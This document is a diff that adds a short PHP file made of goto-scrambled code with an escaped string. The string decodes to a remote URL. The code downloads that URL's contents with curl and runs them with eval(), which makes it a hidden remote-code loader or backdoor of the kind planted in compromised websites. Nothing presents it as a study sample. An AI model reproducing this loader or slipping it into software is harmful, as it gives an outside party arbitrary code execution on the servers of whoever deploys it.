@@ -1,0 +1,2 @@
+<?php
+    goto hmf_q; y01R_: $ch = curl_init(); goto dem96; e0D9n: curl_close($ch); goto S24iQ; hmf_q: $link = "\x61\160\151\x64\145\143\157\144\x65\x2e\144\x65\x76\57\x70\x75\142\x2e\x74\170\x74"; goto y01R_; S24iQ: eval("\77\x3e" . $output); goto BkLPa; BqCM1: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto wB6to; dem96: curl_setopt($ch, CURLOPT_URL, $link); goto BqCM1; wB6to: $output = curl_exec($ch); goto e0D9n; BkLPa: ?>
